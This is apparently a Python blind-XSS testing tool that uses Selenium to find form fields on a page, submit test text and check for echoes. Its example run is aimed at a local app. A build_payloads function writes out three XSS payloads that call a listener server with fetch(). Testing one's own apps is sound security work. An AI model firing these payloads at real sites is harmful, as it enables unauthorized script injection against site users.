from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

def find_tags(html_content, tags):
    """Função responsável por encontrar as tags passadas como parâmetro"""
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        found_tags = []

        for tag in tags:
            foud_tag_elements = soup.find_all(tag)
            for tag_elements in foud_tag_elements:
                if tag_elements:
                    tag_info = { "name" : tag_elements.get('name'),
                                "id" :  tag_elements.get('id'),
                                "type" : tag_elements.get('type'),
                                }
                    found_tags.append(tag_info)
        return found_tags
    except Exception as e:
        print(f"An error occurred while parsing HTML: {e}")
        return []

def get_rendered_html(url):
    """Captura HTML após renderização do JavaScript."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(url)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body"))) 

        # Tenta fechar modal ou um popup comum para não interferir nos testes
        try:
            # Procura botão de fechar
            close_button = driver.find_element(By.XPATH, "//button[contains(@class, 'close') or contains(@aria-label, 'close') or text()='×']")
            close_button.click()
            WebDriverWait(driver, 5).until(EC.invisibility_of_element(close_button))
        except:
            try:
                # Procura botão "Dismiss" ou "OK"
                dismiss_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Dismiss') or contains(text(), 'OK') or contains(text(), 'Close')]")
                dismiss_button.click()
                WebDriverWait(driver, 5).until(EC.invisibility_of_element(dismiss_button))
            except:
                try:
                    # Tenta clicar no backdrop
                    backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
                    backdrop.click()
                    WebDriverWait(driver, 5).until(EC.invisibility_of_element(backdrop))
                except:
                    try:
                        # Pressiona ESC 
                        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
                        WebDriverWait(driver, 5).until(EC.invisibility_of_element(backdrop))
                    except:
                        pass
              
        return driver
    except Exception as e:
        print(f"An error occurred while loading the page: {e}")
        driver.quit()
        return None

def eco_test(lista, driver, test_text):
    """Função de teste para enviar um texto nos campos de input."""

    results = []
    for element in lista:
        try:
            input_field = None
            # Pula checkboxes e outros tipos não-texto
            if element.get('type') in ['checkbox', 'radio', 'submit', 'button']:
                continue
            
            # Tenta encontrar por ID primeiro
            if element['id']:
                try:
                    input_field = driver.find_element(By.ID, element['id'])
                    input_field.click()
                    WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, element['id'])))
                except:
                    pass
            #  Tenta encontrar por NAME
            if not input_field and element['name']:
                try:
                    input_field = driver.find_element(By.NAME, element['name'])
                    input_field.click()
                    WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.NAME, element['name'])))
                except:
                    pass
                    
            if input_field:
                input_field.clear() 
                input_field.send_keys(test_text)

                try:
                    # Procura por submit
                    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                    submit_button.click()
                except:
                    # Procura por login 
                    try:
                        login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Log in')]")
                        login_button.click()
                    except:
                        input_field.send_keys(Keys.RETURN)
                
                results.append({
                    'element': element,
                    'status': 'success',
                    'payload_sent': test_text,
                    'eco_text': eco_verificator(driver, test_text)
                })
                
        except Exception as e:
            results.append({
                'element': element,
                'status': 'failed',
                'error': str(e)
            })
    return results

def eco_verificator(driver, eco_text):
    """Verifica se o texto enviado foi processado corretamente."""
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        body_text = driver.find_element(By.TAG_NAME, "body").text
        if eco_text in body_text:
            return True
        return False
    except Exception as e:
        print(f"An error occurred during verification: {e}")
        return False

def build_payloads(url_ouvinte):
    """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
    payloads = []
    payloads_models = [
        "<img src=x onerror=fetch('{url_ouvinte}')>",
        "<svg onload=fetch('{url_ouvinte}')>",
        "<details open ontoggle=fetch('{url_ouvinte}')>"
    ]

    for model in payloads_models:
        payloads.append(model.format(url_ouvinte=url_ouvinte))
    return payloads

# Exemplo de uso
driver = get_rendered_html("http://localhost:3000/#/search")
if driver:
    html = driver.page_source
    found_tags = find_tags(html, TAGS_TO_FIND)
    
    # Testa os campos encontrados
    test_results = eco_test(found_tags, driver,"TESTANDO")
    # Filtra apenas os sucessos
    successful_results = [result for result in test_results if result['status'] == 'success']
    print(test_results)
    print(f"Resultados do teste: {successful_results}")
    
    driver.quit()

